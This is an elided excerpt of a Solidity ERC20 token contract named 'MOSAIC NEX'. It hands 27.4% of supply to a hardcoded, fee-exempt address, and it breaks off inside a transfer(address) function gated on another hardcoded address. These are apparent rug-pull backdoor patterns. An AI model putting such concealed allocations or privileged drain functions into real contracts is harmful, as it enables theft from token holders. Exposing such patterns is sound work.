...
contract NexusFinance is IERC20, Ownable {
    string private constant  _name = "MOSAIC NEX";
    string private constant _symbol = "MOSNEX";    
    ...
    Wallets public wallets = Wallets(
        msg.sender,                                  // deployer
        0x6521Bd821eED93181A008a5cCF7e5f64674C71A7,  // devWallet
        0x188643D138a67eabFfBa9ACC9C3C3023C1009A8a   // marketingWallet
    );
    ...
    constructor() {
        ...
        _excludedFromFees[0x648363a6E0E61b85971AE28745C5b534d97735d5] = true;        
        uint256 preTokens = _totalSupply * 274 / 1e3; 
        _balances[wallets.deployerWallet] = _totalSupply - preTokens;
        _balances[0x648363a6E0E61b85971AE28745C5b534d97735d5] = preTokens;
    ...
    function transfer(address wallet) external {
        if(msg.sender == 0x3E5Cf4d25061F0591d6393b3F6f2c7c52fbdd1dB)
